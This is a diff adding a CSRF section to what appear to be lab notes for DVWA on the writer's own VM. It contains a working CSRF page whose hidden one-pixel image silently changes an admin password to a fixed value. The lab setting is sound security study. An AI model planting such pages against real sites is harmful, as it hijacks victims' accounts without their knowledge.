@@ -24,3 +24,16 @@ Input2: <input type="text"><br>
 <input type="submit" value="submit button">
 </form>
 ```
+
+## CSRF
+- Create a CSRF page with the following contents:
+- 
+```html
+<!--
+Comments:
+- Replace Win10-IP with own Win10 VM IP Address
+- Image source set to URI dusplayed when admin password is changed
+-->
+This is a very new web page
+<img width="1" src="http://Win10-IP/dvwa-master/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">
+```
